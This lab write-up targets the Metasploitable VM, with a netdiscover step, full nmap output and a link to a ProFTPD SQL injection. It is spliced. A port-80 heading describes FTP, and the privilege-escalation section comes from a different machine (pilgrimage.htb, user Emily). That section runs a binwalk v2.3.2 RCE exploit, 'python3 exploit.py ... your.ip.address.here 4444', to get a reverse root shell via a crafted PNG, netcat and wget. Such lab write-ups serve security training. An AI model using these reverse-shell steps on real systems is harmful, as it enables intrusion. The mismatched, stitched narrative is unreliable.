# Metasploitable

[Download Link](https://www.vulnhub.com/entry/metasploitable-1,28/)

## Host Discovery

To check the IP of the metasploitable machine running as a VM all we have do is makle sure both our attack machine and the metasploit VM are on the same network (regardless if attack machine is the host machine).

Then we can simply run the `netdiscover` command to find the IP.

![image](https://github.com/vsang181/Metasploitable/assets/28651683/d71e86e7-d227-4a5d-88ec-a03d363cb69c)

## Enumeration

### Initial Nmap Scan
Lets start with an initial Nmap scan to scan of all open ports and the services running on those ports.

```
nmap -sCV -p- -O 192.168.75.129
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 05:39 GMT
Nmap scan report for 192.168.75.129
Host is up (0.00054s latency).
Not shown: 65522 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.1
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
|_ssl-date: 2024-01-27T05:39:43+00:00; 0s from scanner time.
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 18
|   Capabilities flags: 43564
|   Some Capabilities: ConnectWithDatabase, Speaks41ProtocolNew, SupportsCompression, SupportsTransactions, SwitchToSSLAfterHandshake, Support41Auth, LongColumnFlag
|   Status: Autocommit
|_  Salt: ,IhQ;tX9V$PGTNlT?}yh
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2024-01-27T05:39:43+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/5.5
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
MAC Address: 00:0C:29:44:35:DD (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2024-01-27T00:39:32-05:00
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h15m00s, deviation: 2h30m00s, median: 0s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.27 seconds
```

The scan resulted in showing multple ports open 21, 22 ,23, 25, 53, 80, 139, 445, 3306, 5432, 8009 and 8180.

### Exploring Port 80 

As shown in the results the port 80 is running FTP service with service version as "ProFTPD 1.3.1".

A quick google search reveals a sql injection vulnerability.

[ProFTPd 1.3 - 'mod_sql' 'Username' SQL Injection](https://www.exploit-db.com/exploits/32798)




















## Privilege Escalation

An initial attempt to run 'sudo -l' to list Emily's sudo privileges was unsuccessful.

By running the linpeas.sh script, we discovered a process located at /usr/sbin/malwarescan.sh. As user Emily, we have read permissions for this process.

The content of the script revealed the following details:

![image](https://github.com/vsang181/Hackthebox/assets/28651683/d0188909-07c1-4fc7-9dc9-6e6cd3c3d177)

The bash script was designed to monitor a specific directory (/var/www/pilgrimage.htb/shrunk/) for the creation of new files, employing the 'inotifywait' command for this purpose.

The script has a blacklist, an array of string patterns ("`Executable script`" and "`Microsoft executable`"). If the output of the `binwalk` command (stored in the `binout` variable) contains any of the blacklisted string patterns, the script removes the file.

A check on the 'binwalk' version revealed it to be Binwalk v2.3.2.

A quick Google search for known exploits against this version of binwalk unveiled a Remote Command Execution (RCE) vulnerability.

[Binwalk v2.3.2 - Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/51249)

With this identified vulnerability, we had the potential to remotely execute code as root within the system.

The exploit code was saved into a file, named, for instance, 'exploit.py'.

The exploit was launched using the following command:

```
python3 exploit.py /path/to/input.png your.ip.address.here 4444
```

This operation created a png file ready to be uploaded and subsequently executed by 'binwalk', as identified earlier in the 'malwarescan.sh' script.

Concurrently, we started listening on the specified port via 'netcat'.

An HTTP server was then started, and while still in SSH, the 'wget' command was used to retrieve the file into the specified folder.

This process ultimately resulted in gaining a root shell, enabling access to the coveted root flag.
